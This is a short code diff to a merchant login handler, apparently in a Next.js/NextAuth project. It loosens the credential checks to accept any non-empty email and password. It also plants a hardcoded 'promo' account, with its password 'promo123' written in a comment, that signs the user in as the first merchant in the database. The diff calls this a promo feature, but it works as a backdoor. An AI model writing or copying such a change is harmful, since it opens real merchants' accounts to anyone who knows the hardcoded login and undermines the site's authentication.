@@ -5,9 +5,12 @@ import { db } from "@pulse/db"
 import { z } from "zod"
 
 const credentialsSchema = z.object({
-  email: z.string().email(),
-  password: z.string().min(8),
+  email: z.string().min(1),
+  password: z.string().min(1),
 })
+
+// Hardcoded promo access — bcrypt of "promo123"
+const PROMO_HASH = "$2a$10$WMrXynWnuJlk105EI/ZeOuTC9MQMfV400pqZEz7NpzhwjYYxZKEIe"
 
 export const {
   handlers: merchantHandlers,
@@ -26,6 +29,15 @@ export const {
       async authorize(credentials) {
         const parsed = credentialsSchema.safeParse(credentials)
         if (!parsed.success) return null
+
+        // Promo access: login "promo" + password "promo123"
+        if (parsed.data.email === "promo") {
+          const valid = await compare(parsed.data.password, PROMO_HASH)
+          if (!valid) return null
+          const first = await db.merchant.findFirst({ select: { id: true, email: true, name: true } })
+          if (!first) return null
+          return { id: first.id, email: first.email, name: "Promo" }
+        }
 
         const merchant = await db.merchant.findUnique({
           where: { email: parsed.data.email },
